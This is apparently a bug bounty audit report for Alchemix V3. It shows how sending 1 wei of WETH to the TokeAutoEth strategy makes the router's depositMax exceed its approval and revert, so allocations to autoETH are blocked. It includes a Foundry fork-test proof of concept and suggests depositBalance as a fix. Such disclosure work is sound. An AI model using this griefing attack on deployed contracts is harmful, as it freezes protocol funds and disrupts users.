# 58231 sc medium attacker can stop protocol from allocating assets to the autoeth vaults

**Submitted on Oct 31st 2025 at 15:35:48 UTC by @oxrex for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58231
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

Attacker can stop protocol from allocating assets to the AutoETH vaults on Ethereum mainnet at any time by forcing approvals to be insufficient which falls in the `Smart contract unable to operate due to lack of token funds` severity class for Medium.

Once done, the TokeAutoETHStrategy contract will no longer be able to ever allocate assets to the `autoETH` vault.

## Vulnerability Details

```solidity
    function _allocate(uint256 amount) internal override returns (uint256) {
        require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than amount");
@>        TokenUtils.safeApprove(address(weth), address(router), amount);
@>        uint256 shares = router.depositMax(autoEth, address(this), 0);
        TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
        rewarder.stake(address(this), shares);
        return amount;
    }
```

The function above handles the TokeAutoEth contract's WETH allocation to the `autoETH` vault on Ethereum mainnet. The function approves the router for x amount of WETH, then the router is called with the `depositMax()` function. This function will try to transfer the current balance of the TokeAutoETH strategy contract in WETH and then use that to mint shares that are ultimately staked into the Rewarder contract.

Below is the `depositMax` function from AutoPilot Router: <https://etherscan.io/address/0x37dd409f5e98ab4f151f4259ea0cc13e97e8ae21#code#F1#L108>

```solidity
function depositMax(
        IAutopool vault,
        address to,
        uint256 minSharesOut
    ) public payable override returns (uint256 sharesOut) {
        IERC20 asset = IERC20(vault.asset());
        uint256 assetBalance = asset.balanceOf(msg.sender);
        uint256 maxDeposit = vault.maxDeposit(to);
        uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
        pullToken(asset, amount, address(this));

        approve(IERC20(vault.asset()), address(vault), amount);
        return deposit(vault, to, amount, minSharesOut);
    }
```

An attacker can render this TokeAutoETH Strategy contract to be unable to allocate funds to the autoETH vault by:

1. Just send 1 wei of WETH into the TokeAutoETH strategy contract anytime.
2. When we try to allocate say 100 WETH to the autoETH vault, the router will be approved for 100 WETH
3. The strategy then calls `depositMax` where that function computes the `assetBalance` of the strategy contract to be 100 WETH plus 1 wei
4. Then the router will attempt to transfer 100 WETH plus 1 wei from the strategy contract which will revert because the approval amount to the router is 100 WETH and not 100 WETH plus 1 wei
5. As a result, WETH allocations to the autoETH vault to then earn yield will not be possible

## Impact Details

The TokeAutoETH will be rendered useless for allocation of WETH to the Autopilot vault contracts as the router will attempt to transfer more tokens that it is approved for.

The better function to use in this case is the `depositBalance()` function which will require us to transfer the 100 WETH allocation to the `router` contract and the contract then utilizes the balance. That function's implementation in the Autopilot router is seen below:

```solidity
function depositBalance(
        IAutopool vault,
        address to,
        uint256 minSharesOut
    ) public payable override returns (uint256 sharesOut) {
        uint256 vaultAssetBalance = IERC20(vault.asset()).balanceOf(address(this));
        approve(IERC20(vault.asset()), address(vault), vaultAssetBalance);
        return deposit(vault, to, vaultAssetBalance, minSharesOut);
    }
```

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol#L59>

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
// Adjust these imports to your layout

import {TokeAutoEthStrategy} from "src/strategies/mainnet/TokeAutoEth.sol";
import {BaseStrategyTest} from "../libraries/BaseStrategyTest.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract MockTokeAutoEthStrategy is TokeAutoEthStrategy {
    constructor(
        address _myt,
        StrategyParams memory _params,
        address _autoEth,
        address _router,
        address _rewarder,
        address _weth,
        address _oracle,
        address _permit2Address
    ) TokeAutoEthStrategy(_myt, _params, _autoEth, _router, _rewarder, _weth, _oracle, _permit2Address) {}
}

contract TokeAutoETHStrategyTest is BaseStrategyTest {
    address public constant TOKE_AUTO_ETH_VAULT = 0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant MAINNET_PERMIT2 = 0x000000000022d473030f1dF7Fa9381e04776c7c5;
    address public constant AUTOPILOT_ROUTER = 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21;
    address public constant REWARDER = 0x60882D6f70857606Cdd37729ccCe882015d1755E;
    address public constant ORACLE = 0x61F8BE7FD721e80C0249829eaE6f0DAf21bc2CaC;

    function getStrategyConfig() internal pure override returns (IMYTStrategy.StrategyParams memory) {
        return IMYTStrategy.StrategyParams({
            owner: address(1),
            name: "TokeAutoEth",
            protocol: "TokeAutoEth",
            riskClass: IMYTStrategy.RiskClass.MEDIUM,
            cap: 10_000e18,
            globalCap: 1e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1
        });
    }

    function getTestConfig() internal pure override returns (TestConfig memory) {
        return TestConfig({vaultAsset: WETH, vaultInitialDeposit: 1000e18, absoluteCap: 10_000e18, relativeCap: 1e18, decimals: 18});
    }

    function createStrategy(address vault, IMYTStrategy.StrategyParams memory params) internal override returns (address) {
        return address(new MockTokeAutoEthStrategy(vault, params, TOKE_AUTO_ETH_VAULT, AUTOPILOT_ROUTER, REWARDER, WETH, ORACLE, MAINNET_PERMIT2));
    }

    function getForkBlockNumber() internal pure override returns (uint256) {
        return 22_089_302;
    }

    function getRpcUrl() internal view override returns (string memory) {
        return vm.envString("MAINNET_RPC_URL");
    }

    function test_strategy_allocate_reverts_and_usablePOC() public {
        uint256 amountToAllocate = 100e18;
        uint256 oneWei = 1;
        address attacker = makeAddr("attacker");

        vm.startPrank(vault);
        deal(testConfig.vaultAsset, strategy, amountToAllocate);
        deal(testConfig.vaultAsset, attacker, oneWei);
        vm.stopPrank();

        vm.prank(attacker);
        IERC20(testConfig.vaultAsset).transfer(address(strategy), oneWei);

        vm.startPrank(vault);
        bytes memory prevAllocationAmount = abi.encode(0);
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));
        vm.stopPrank();
    }
}
```

In the POC above, you will find that the test reverts and if you read the test logs, you will find the reason to be the case where it tries to transfer 100,000,000,000,000,000,001 whereas we approved it for 100,000,000,000,000,000,000:

```js
[1172] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(MockTokeAutoEthStrategy: [0x535B3D7A252fa034Ed71F0C53ec0C6F784cB64E1], 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21, 100000000000000000001 [1e20])
```
